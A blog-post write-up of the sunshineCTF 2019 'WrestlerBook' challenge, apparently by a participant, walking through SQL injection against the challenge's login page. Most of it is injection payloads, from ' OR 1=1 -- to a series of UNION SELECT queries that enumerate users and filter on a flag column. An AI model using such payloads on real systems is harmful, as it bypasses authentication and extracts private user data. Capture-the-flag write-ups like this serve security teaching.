---
layout: blogpost
title:  "sunshineCTF - Wrestler Book"
date:   2019-03-31 21:00:00 +2100
categories: ctf
---

## Challenge: 
WrestlerBook
## Description: 
"WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn't get an invite don't even bother trying to view our profile."
<br>
## Solution:
First thing I try on here is a simple ' OR 1=1 -- which gets us into hulk hogan. There is a flag attribute that he doesnt have. After trying a lot of different injections I finally crafted this:<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie') \-\- <br>
which brought us to a new page who is Jim Duggan and who also doesnt have a flag. My guess is we keep adding these users to the list of users we dont want. Maybe we will soon get a user with a flag.<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim') \-\-<br>
next username still no flag: machoasf<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf') \-\-<br>
Another one:milliondollarman<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman') \-\-<br>
'rich_flair'<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') \-\-<br>
'user1': George Steele<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair', 'user1', 'user10', 'user100','user101','user102', 'user103', 'user104', 'user105','user106','user107','user108','user109') \-\- <br>
New idea is to check who isnt in the first set of users and who dont have the name user in their username<br>
' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' \-\-<br>
SELECT * FROM users WHERE username = '' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' ' and password = '' OR 1=1 \-\-' <br>
SELECT * FROM users WHERE username = ' <br>
' UNION SELECT * FROM users WHERE username NOT LIKE 'user%' AND username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') ' and password = ''<br>
NOW:
	write query filtering something else than username

' UNION SELECT * FROM users WHERE password LIKE '%sun% '<br>
```After filtering based on ID I notied that the profiles were coming up in the same exact order as they were when I filtered by username which made me realize the other things listed must also be parts of the databse. I reconstructed this query below```

' UNION SELECT * FROM users WHERE flag NOT LIKE 'N%' AND flag NOT LIKE 'ex%' \-\- <br>
FINALLY when using the query above we get:<br>
"Generic Wrestler
Username: user84
Age: 65
Title: N/A
Flag: sun{ju57_4n07h3r_5ql1_ch4ll}"
